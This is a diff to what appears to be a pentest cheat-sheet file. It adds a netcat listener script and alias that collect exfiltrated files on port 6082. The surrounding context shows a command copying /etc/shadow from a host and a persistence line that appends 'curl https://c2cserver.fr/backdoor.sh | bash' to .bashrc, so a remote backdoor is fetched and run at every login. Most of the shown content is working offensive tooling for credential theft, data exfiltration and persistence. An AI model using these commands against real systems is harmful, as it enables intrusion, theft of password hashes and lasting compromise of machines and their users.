@@ -47,8 +47,24 @@ favorites:
         ## Connect via ssh
         ssh BUR | scp BUR:/etc/shadow .
         ```
+        ```bash
+        /!\ Everytime you restart the listener, you delete old data
+        #!/bin/bash
+        ## Heavy duty nc listener
+        i=1
+        echo "Listening on port 6082..."
+        while true; do
+          nc -lp 6082 > "exfil_$i.bin"
+          echo "File received... Saved as exfil_$i.bin"
+          i=$((i+1))
+        done
 
+        ## or as an ALIAS
+        alias ncget='i=1; echo "Listening on port 6082..."; while true; do nc -lp 6082 > "exfil_$i.bin"; echo "File received → exfil_$i.bin"; i=$((i+1)); done'
 
+        ## show all files
+        grep '' exfil*
+        ```
 tooling:
   text: Prepare your tools
   txtcolor: "#9CCBFF"
@@ -463,5 +479,6 @@ Pentest:
         echo "curl https://c2cserver.fr/backdoor.sh | bash" >> .bashrc    ## Loads Everytime theuser opens a session
         ```
         
+
 
 
